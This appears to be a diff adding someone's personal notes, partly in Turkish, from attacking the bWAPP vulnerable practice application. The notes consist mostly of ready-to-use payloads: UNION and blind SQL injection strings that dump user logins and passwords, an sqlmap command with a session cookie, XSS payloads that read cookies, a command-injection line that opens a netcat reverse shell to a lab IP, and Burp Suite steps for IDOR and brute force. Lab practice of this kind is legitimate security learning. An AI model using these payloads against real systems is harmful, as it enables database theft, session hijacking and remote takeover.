@@ -1,0 +1,130 @@
+=============================================|
+SQL UNION METHOD (SQL INJECTION (GET/SEARCH))
+=============================================|
+
+
+%man  
+man%
+%man%
+
+select*from movies WHERE title LIKE '%".sqli ($title)."%'
+
+man' ORDER BY 7#
+
+man' UNION SELECT 1,2,3,4,5,6,7 from information_schema.tables WHERE table_schema=database() #
+
+man' UNION SELECT 1 , table_name , column_name , 4,5,6,7 FROM information_schema.columns WHERE table_name = 'users' #
+
+man' UNION SELECT 2, login, password , 4,5,6,7 FROM users#
+
+man' UNION SELECT 2, admin, password , 4,5,6,7 FROM users#
+
+
+=======================================================|
+SQL BLIND METHOD / SQL INJECTION-BLIND-BOOLEAN-BASED)  
+=======================================================|
+
+
+Iron man' and 1=1#:
+-------------------------------------------------------------------------
+substring()
+
+substring('Blackbox' , 1,1):B
+
+substring('Blackbox' , 2,1):l
+
+substring('Blackbox' , 1,2):Bl
+
+substring('Blackbox' , 3,3):ack
+------------------------------------------------------------------------
+Iron man' and substring(database(),1,1)='a'#
+
+Iron man' and substring(database(),2,1)='b'#
+
+Iron man' and ascii(substring(database(),2,1)) < 85 #
+
+Iron man' and ascii (substring(database(),2,1)) = 87 #
+
+man'union (select 1,2 , table_name , 4,5,6,7 from information_schema.tables WHERE table_schema=database() limit 1,1)# <90#
+
+
+
+====================================|
+SQLMAP KULLANIMI (DATABASE TAHMİNİ)
+====================================|
+sudo su
+sqlmap --help
+
+sqlmap -u "http://192.168.1.13/bWAPP/sqli_1.php?title=man&action=search"  --cookie="PHPSESSID=325c329a29fbbb8884ada800d209844c; security_level=0" -p title --dbs
+
+
+--dbs yerine = --tables , --columns , --dump 
+
+
+
+=============================================================|
+REFLECTED XSS (A3-CROSS-SITE SCRIPTING(XSS)-REFLECTED (GET))
+=============================================================|
+
+
+mert <script> alert(1) </script>
+demir <script> alert(1) </script>
+
+<script> alert(document.cookie) </script>
+
+
+
+=================================================|
+STORED XSS (A3-CROSS-SITE SCRIPTING-STORED(BLOG))
+=================================================|
+
+
+* ÇALIŞMADI BURAYA TEKRARDAN BAK *
+
+
+
+========================================|
+INSECURE DIRECT OBJECT REFERENCES (IDOR)
+========================================|
+
+A4-CHANGE SECRET
+-----------------
+
+burpsuite --> proxy --> intercept is on --> http history 
+
+
+A4-ORDER TICKETS
+-----------------
+
+burpsuite --> proxy --> intercept is on/off --> veriyi degistir --> forward
+
+
+
+========================================|
+COMMAND INJECTION (OS COMMAND INJECTION) 
+========================================|
+
+
+* TIMEOUT HATASI VERIYOR *
+
+
+
+www.nsa.gov;nc -nv 192.168.163.130 1337 -e bin/bash (bwApp)
+
+nc -lvp 1337 (Kali)
+
+
+
+==============================================|
+FILE INCLUSION(A7-REMOTE&LOCAL FILE INCLUSION)
+==============================================|
+
+* MSFVENOM ISIMLI TOOL KULLANIYOR BAKMADIM *
+
+
+
+============|
+BRUCE FORCE 
+============|
+
+Burp Suiteden --> Proxy - Intercept - Intercept is on - Action - Send to Inturuder --> Inturuder - Position - Clear and $add -Login passwd add - Attack Type(Clauster Bomb) - Payloud - 1.payloud(username) - 2.payloud(passwd) - Start Attack
